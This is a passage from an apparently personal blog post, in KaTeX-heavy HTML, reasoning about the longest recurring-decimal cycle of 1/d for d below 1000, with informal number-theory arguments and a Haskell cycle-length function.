mtight">b</span></span></span></span></span></span></span></span></span></span></span>, then calculate the least common multiple, definitely less than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>a</mi></msup><msup><mi>q</mi><mi>b</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p^a q^b-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>. That is to say, for the prime p, its order is necessarily greater than the order of any number smaller than it. So just find the largest prime <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> within 1000, and compare it with the number that has been removed up to 1000 and is larger than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>.</p><p>This involves the question, <strong>between two adjacent primes p, q, is it possible for a number divided by 2 to be larger than p?</strong> This is actually equivalent to whether there exists <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p&lt;x&lt;q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>p</mi><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">2p&lt;x&lt;q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>. I don’t know, but it’s impossible within 1000.</p><p>So, <strong>between two adjacent primes p,q, is there <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><msubsup><mi>p</mi><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msubsup><mo>⋯</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">x=p_{1}^{a_1}p_{2}^{a_2}\cdots p_{m}^{a_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> not a multiple of 2 or 5, not a prime, but the order of 10^k mod x is larger than the order of 10^k mod p?</strong> That is,</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathrm{gcd}\left( \varphi \left( p_{1}^{a_1} \right) ,\cdots ,\varphi \left( p_{m}^{a_m} \right) \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0163em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>Could it be larger than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>?</p><p>This number must be less than the product of these Euler’s functions</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo fence="true">)</mo></mrow><mo>⋯</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( x \right) =\varphi \left( p_{1}^{a_1} \right) \cdots \varphi \left( p_{m}^{a_m} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0163em;vertical-align:-0.2663em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>And <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>&lt;</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">\varphi \left( x \right)&lt;x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>. Moreover, except</p><p>for the prime number 2, p-1 is necessarily an even number, so there must be a common factor of 2, back to the previous question, at least within 1000 it is impossible. After dividing by 2, it must be smaller than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>.</p><p>Therefore, the number with the longest cycle must be a prime number. If it can be proved:</p><ol><li><strong>Between two adjacent prime numbers p, q, any number divided by 2 is definitely smaller than p</strong>.</li><li><strong>Multiplying a finite decimal by an infinite recurring decimal does not change the length of the recurring cycle</strong>.</li></ol><p>It seems that there are related theorems that can prove the second point, and also obtain the length of the non-recurring part.</p><h1>Conventional Intuitive Approach</h1><p>A recurring decimal must be infinite, and the digits in the recurring cycle may repeat. Based on coding experience, without reading to the last digit, it is impossible to know whether this string of digits is a recurring cycle. Therefore, a maximum possible recurring cycle length must be set.</p><p>Secondly, even if it is a recurring cycle, it may not be the shortest recurring cycle; it could be a multiple of the shortest recurring cycle. For example, the cycle of 001 also satisfies the cycle of 001001. So when a cycle is found, its factor length cannot be the cycle length.</p><p>The recurring part, choosing the length of the recurring cycle from anywhere, its period does not change. Like the 001 cycle, in fact, only looking at the latter part can also be considered as a 010 cycle.</p><p>So, as long as you skip enough decimal places, it will definitely be the recurring part, and the period remains the same. Just look for two segments that match up according to the period length.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Generates the decimal representation of 1/deno after the decimal point.</span></span><br><span class="line"><span class="title">afterPoint</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">afterPoint</span> = afterPoint&#x27; <span class="number">1</span></span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    afterPoint&#x27; num deno =</span><br><span class="line">      <span class="keyword">let</span> (d, r) = (<span class="number">10</span> * num) `divMod` deno <span class="comment">-- Multiplies numerator by 10, divides by denominator, and keeps remainder.</span></span><br><span class="line">       <span class="keyword">in</span> d : afterPoint&#x27; r deno <span class="comment">-- Recursively continues with remainder as new numerator.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Calculates the length of the recurring cycle in the decimal representation of 1/deno.</span></span><br><span class="line"><span class="title">recurCycle</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">recurCycle</span> deno = recurCycle&#x27; onlyCycle maxPossibleLen</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    maxSkip = myLog2 deno <span class="comment">-- Determines the number of digits to skip based on log base 2 of denominator.</span></span><br><span class="line">    onlyCycle = drop maxSkip $ afterPoint deno <span class="comment">-- Skips initial digits that don&#x27;t participate in the cycle.</span></span><br><span class="line">    maxPossibleLen = deno - <span class="number">1</span> <span class="comment">-- The maximum possible cycle length is deno - 1.</span></span><br><span class="line">    recurCycle&#x27; xs len</span><br><span class="line">      | all (== <span class="number">0</span>) (take maxPossibleLen xs) = <span class="number">0</span> <span class="comment">-- If all digits are zero, cycle length is 0.</span></span><br><span class="line">      | whenLen len &amp;&amp; not (any whenLen (factors len)) = len <span class="comment">-- Checks if current length satisfies cycle conditions.</span></span><br><span class="line">      | otherwise = recurCycle&#x27; xs (len - <span class="number">1</span>) <span class="comment">-- Otherwise, decreases length and tries again.</span></span><br><span class="line">      <span class="keyword">where</span></span><br><span class="line">        whenLen l = (l /= <span class="number">0</span>) &amp;&amp; listEq (take l xs) (drop l xs) <span class="comment">-- Checks if two subsequences of length l are equal.</span></span><br><span class="line">    myLog2 :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line">    myLog2 num = floor $ logBase <span class="number">2</span> (fromIntegral num) <span class="comment">-- Calculates the floor of log base 2 of a number.</span></span><br><span class="line">    listEq [] _ = <span class="type">True</span> <span class="comment">-- Base case for equality check: empty list is equal to any list.</span></span><br><span class="line">    listEq (x : xs) (y : ys) = (x == y) &amp;&amp; listEq xs ys <span class="comment">-- Recursive case: checks if heads are equal and proceeds to tails.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Generates the list of factors of a number by finding divisors up to the square root and their complements.</span></span><br><span class="line"><span class="title">factors</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">factors</span> num = <span class="keyword">let</span> halfFactors = filter ((== <span class="number">0</span>) . mod num) [<span class="number">2</span> .. floor . sqrt $ fromIntegral num] <span class="keyword">in</span> halfFactors ++ map (div num) (reverse halfFactors)</span><br></pre></td></tr></table></figure><h1>Considering the Length Characteristics of the Recurring Cycle</h1><p>The recurring part of a recurring decimal is actually a number multiplied by a geometric series, which can be expressed as</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0.</mn><mrow><mo fence="true">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mrow><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup></mrow></mrow><annotation encoding="application/x-tex">0.\left( a_1\cdots a_n \right) =a_1\cdots a_n\sum_{i=1}^{\infty}{10^{-in}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8747em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal 